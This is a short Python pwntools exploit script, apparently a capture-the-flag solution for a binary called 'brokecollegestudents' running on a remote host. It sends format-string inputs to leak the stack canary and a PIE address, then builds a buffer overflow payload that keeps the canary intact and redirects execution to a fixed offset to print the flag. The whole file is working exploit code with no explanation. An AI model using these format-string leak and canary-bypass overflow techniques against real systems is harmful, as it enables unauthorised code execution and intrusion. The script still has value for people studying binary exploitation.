#!/usr/bin/python3
from pwn import *

elf = context.binary =  ELF('./brokecollegestudents',checksec=False)
p = process()
p = remote('143.198.184.186',5001)
# context.log_level = 'DEBUG'

p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
p.sendline('%9$p')
p.recvuntil('0x')
canary = int(f"0x{p.recv(16).decode()}",16)
log.success(f'canary: {hex(canary)}')
p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
p.sendline('%8$p')
p.recvuntil('0x')
pie_leak = int((f"0x{p.recv(12).decode()}"),16)
p.recv()
pie_base = pie_leak - 4448
log.success(f'pie leak: {hex(pie_leak)}')
log.success(f'pie base: {hex(pie_base)}')

# p.interactive()
p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
p.sendline('1')
p.recv()
payload = b'A'*24
payload += p64(canary)
payload += b'A'*8
payload += p64(pie_base + 0x00000000000014f1)

p.sendline(payload)
log.success(f'Flag: {p.recvall().decode().split()[-1].replace("A","")}')â€Š
